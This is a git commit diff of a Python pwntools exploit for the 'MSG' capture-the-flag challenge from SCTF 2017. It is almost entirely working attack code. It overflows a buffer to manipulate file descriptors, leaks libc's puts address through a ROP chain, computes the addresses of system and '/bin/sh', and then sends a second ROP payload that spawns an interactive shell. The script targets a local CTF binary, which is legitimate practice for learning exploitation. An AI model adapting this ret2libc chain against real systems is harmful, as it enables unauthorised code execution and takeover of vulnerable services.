ee9ac17d10291d76f650baaa1cdf05e59d4dc87e
DelspoN <delsponn@gmail.com>
2017-07-18 08:56:04 +0900

    successful to exploit

--- sctf2017/MSG/ex.py
+++ sctf2017/MSG/ex.py
@@ -1,26 +1,22 @@
 from pwn import *
 
 p = process("./MSG")
-print p.recv()
+p.recv()
 p.sendline("1")
-print p.recv()
+p.recv()
 p.sendline("a"*252+p32(0x00000002))
 # open 3, close stderr(2)
 
-print p.recv()
+p.recv()
 p.sendline("1")
-print p.recvuntil("Msg ID : ")
+p.recvuntil("Msg ID : ")
 msgId = p.recvline()
-print msgId
-print p.recv()
+p.recv()
 p.sendline("a"*252+p32(0x00000004))
 # open 2, close 4
 
 
 # ----- For offset ----- #
-dummy = "This string is invalid string... : \n"
-dummyLen = len(dummy)
-
 p.recv()
 p.sendline("3")
 p.recvuntil("Input msg ID :")
@@ -31,22 +27,84 @@ p.sendline("3")
 p.recvuntil("Input msg ID :")
 p.sendline("/"*80)
 
-print p.recv()
+p.recv()
 p.sendline("3")
-print p.recvuntil('Input msg ID : ')
+p.recvuntil('Input msg ID : ')
 # --------------------- #
 
-# ROP possible
+# ROP
+main = 0x08048D74
+pr = 0x80485ad
+puts_plt = 0x8048630
+puts_got = 0x804b028
 payload = "..."
-payload += p32(0x8048aa4)		# print 'msg : '
-print len(payload)
+payload += p32(puts_plt)
+payload += p32(pr)
+payload += p32(puts_got)
+payload += p32(main)
 p.sendline(payload)
-print p.recv()
+p.recv()
 
 p.sendline('3')
-print p.recvuntil("Input msg ID : ")
+p.recvuntil("Input msg ID : ")
 p.sendline(msgId)
+p.recvuntil("\x0a\x0a")
+
+puts = u32(p.recv(4))
+base = puts - 0x0005fca0
+system = base + 0x0003ada0
+binsh = puts + 0xfbd0b
+print "leaked puts : " + str(hex(puts))
+print "base : " + str(hex(base))
+print "system : " + str(hex(system))
+print "/bin/sh : " + str(hex(binsh))
 p.recv()
+# ----- leaked ----- #
+
+
+
+# ----- one more trial for exploit ----- #
+p.sendline("1")
+p.recv()
+p.sendline("a"*252+p32(0x00000002))
+# open 3, close stderr(2)
+
+p.recv()
+p.sendline("1")
+p.recvuntil("Msg ID : ")
+msgId = p.recvline()
+p.recv()
+p.sendline("a"*252+p32(0x00000004))
+# open 2, close 4
+
+
+# ----- For offset ----- #
+p.recv()
+p.sendline("3")
+p.recvuntil("Input msg ID :")
+p.sendline("/"*86)
+
+p.recv()
+p.sendline("3")
+p.recvuntil("Input msg ID :")
+p.sendline("/"*80)
+
+p.recv()
+p.sendline("3")
+p.recvuntil('Input msg ID : ')
+# --------------------- #
+
+# ROP
+payload = "..."
+payload += p32(system)
+payload += "aaaa"
+payload += p32(binsh)
+p.sendline(payload)
+p.recv()
+
+p.sendline('3')
+p.recvuntil("Input msg ID : ")
+p.sendline(msgId)
 p.interactive()
 # Exploit!  
 
